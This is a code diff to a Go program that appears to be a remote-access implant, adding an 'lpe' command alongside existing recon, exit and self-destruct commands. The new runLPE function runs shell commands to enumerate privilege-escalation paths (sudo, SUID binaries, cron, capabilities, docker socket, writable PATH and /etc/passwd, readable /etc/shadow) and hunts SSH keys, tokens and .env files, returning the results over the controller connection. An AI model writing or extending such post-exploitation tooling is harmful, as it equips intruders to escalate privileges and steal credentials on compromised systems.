@@ -1,6 +1,7 @@
 package main
 
 import (
+	"bytes"
 	"encoding/json"
 	"flag"
 	"fmt"
@@ -42,6 +43,81 @@ func gatherRecon(conn net.Conn) Recon {
 func getPublicIP(conn net.Conn) string {
 	tcpAddr := conn.LocalAddr().(*net.TCPAddr)
 	return tcpAddr.IP.String()
+}
+
+type LPEResult struct {
+	OSInfo     string   `json:"os_info"`
+	Sudo       string   `json:"sudo"`
+	SUID       string   `json:"suid"`
+	Cron       string   `json:"cron"`
+	Capabilities string `json:"capabilities"`
+	Docker     string   `json:"docker"`
+	PATH       string   `json:"path_writable"`
+	Passwd     string   `json:"passwd_writable"`
+	Shadow     string   `json:"shadow_readable"`
+	WorldWrite string   `json:"world_writable"`
+	Interesting string  `json:"interesting_files"`
+}
+
+func runCmd(name string, args ...string) string {
+	cmd := exec.Command(name, args...)
+	var out bytes.Buffer
+	cmd.Stdout = &out
+	cmd.Stderr = &out
+	if err := cmd.Run(); err != nil {
+		return ""
+	}
+	return strings.TrimSpace(out.String())
+}
+
+func runShell(script string) string {
+	cmd := exec.Command("/bin/sh", "-c", script)
+	var out bytes.Buffer
+	cmd.Stdout = &out
+	cmd.Stderr = &out
+	if err := cmd.Run(); err != nil {
+		return ""
+	}
+	return strings.TrimSpace(out.String())
+}
+
+func runLPE() LPEResult {
+	r := LPEResult{}
+
+	// OS info
+	r.OSInfo = runShell("uname -a; cat /etc/os-release 2>/dev/null || cat /etc/issue 2>/dev/null")
+
+	// Sudo
+	r.Sudo = runShell("sudo -nl 2>/dev/null")
+
+	// SUID binaries
+	r.SUID = runShell("find / -perm -4000 -type f 2>/dev/null | head -30")
+
+	// Cron
+	r.Cron = runShell("ls -la /etc/cron* 2>/dev/null; cat /etc/crontab 2>/dev/null; crontab -l 2>/dev/null; find /etc/cron* -writable -type f 2>/dev/null")
+
+	// Capabilities
+	r.Capabilities = runShell("getcap -r / 2>/dev/null | head -20")
+
+	// Docker group
+	r.Docker = runShell("id | grep -i docker; ls -la /var/run/docker.sock 2>/dev/null")
+
+	// PATH writable dirs
+	r.PATH = runShell("echo $PATH | tr ':' '\\n' | while read d; do [ -w \"$d\" ] && echo \"WRITABLE: $d\"; done")
+
+	// /etc/passwd writable
+	r.Passwd = runShell("[ -w /etc/passwd ] && echo 'WRITABLE' || echo 'not writable'")
+
+	// /etc/shadow readable
+	r.Shadow = runShell("[ -r /etc/shadow ] && echo 'READABLE' || echo 'not readable'")
+
+	// World-writable in key dirs
+	r.WorldWrite = runShell("find /etc /usr/local /opt /var -writable -type f 2>/dev/null | head -20")
+
+	// Interesting files
+	r.Interesting = runShell("ls -la ~/.ssh/ 2>/dev/null; find / -name '*.key' -o -name 'id_rsa' -o -name 'token' -o -name '.env' 2>/dev/null | head -20; cat /etc/passwd | grep -v nologin | grep -v false | head -10")
+
+	return r
 }
 
 func getLocalIP() string {
@@ -115,6 +191,12 @@ func main() {
 		case "exit":
 			fmt.Fprintf(os.Stderr, "exiting...\n")
 			return
+
+		case "lpe":
+			fmt.Fprintf(os.Stderr, "running LPE checks...\n")
+			encoder.Encode(map[string]string{"status": "lpe_running"})
+			results := runLPE()
+			encoder.Encode(results)
 
 		case "destroy":
 			fmt.Fprintf(os.Stderr, "self-destructing...\n")
